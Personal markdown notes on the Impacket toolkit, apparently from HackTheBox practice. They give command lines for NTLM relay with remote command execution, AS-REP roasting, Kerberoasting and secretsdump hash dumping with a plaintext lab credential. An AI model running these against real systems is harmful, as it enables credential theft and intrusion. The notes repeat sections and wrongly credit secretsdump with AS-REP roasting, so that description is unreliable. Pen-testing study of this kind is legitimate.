# Python Impacket
Init.

Python [impacket](https://github.com/fortra/impacket/tree/master) is an open-source collection of scripts designed to interact with common [networking](/networking/OSI/network-layer.md) protocols. Many of the scripts can be used in pen-testing, especially against Windows targets.
## Common Scripts
(I'm keeping a list here for my own use/ reference)
### [`smbrelayx.py`](https://github.com/fortra/impacket/blob/master/examples/smbrelayx.py)
### [`ntlmrelayx.py`](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
```bash
ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'
```
- `tf`: target file
- `-smb2support`: support SMB version 2
- `-c`: command to execute on target system
- `-i`: interactive (will give you a shell)
### [`GetNPUsers.py`](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
Get's TGTs for users in an [active-directory](../../../hidden/HTB-notes/active-directory.md) environment who have *[kerberos](../../../networking/protocols/kerberos.md) pre-authentication turned off.* This is useful to know because having pre-auth turned off means we can ask for their TGTs without supplying a password. 

Once you have a TGT you can crack it with something like [john](../cracking/john.md).
#### Example
```bash
python3 GetNPUsers.py 
```
### [`GetUserSPNs.py`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
```bash
impacket-GetUserSPNs -usersfile [users.lst](https://users.lst) -dc-ip 10.10.10.175 -request 'EGOTISTICAL-BANK.LOCAL/' -no-pass
```
### [`secretdump.py`](https://github.com/fortra/impacket/blob/master/impacket/examples/secretsdump.py)
Will attempt to dump hashes from a remote machine *without executing an agent there*. Gets [kerberos](../../../../networking/protocols/kerberos.md) TGTs from users which have the *`UF_DONT_REQUIRE_PREAUTH`* (which means they have pre-authentication turned off). 

From these types of users we can get their *AS_REP* which is *partially encrypted using their password*. 

Once we have the AS-REP, we can give it to [hashcat](../../cracking/tools/hashcat.md) for cracking (and getting the plaintext password).
### [`GetUserSPNs.py`](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
```bash
impacket-GetUserSPNs -usersfile users.lst -dc-ip 10.10.10.175 -request 'EGOTISTICAL-BANK.LOCAL/' -no-pass
```
### [`secretdump.py`](https://github.com/fortra/impacket/blob/master/impacket/examples/secretsdump.py)
```bash
secretsdump.py 'egotistical-bank.local/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
````
- The domain, user, password, and IP should be surround in quotes
### `mssqlclient.py`
[`mssqlclient.py`](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) can be used to connect to a remote [MSSQL](../../../../CLI-tools/windows/MSSQL.md) server (on a Windows target).
```bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

- `-windows-auth` will authenticate you if you supply a username and password *and force [NTLM](../../../../networking/protocols/NTLM.md) authentication*.
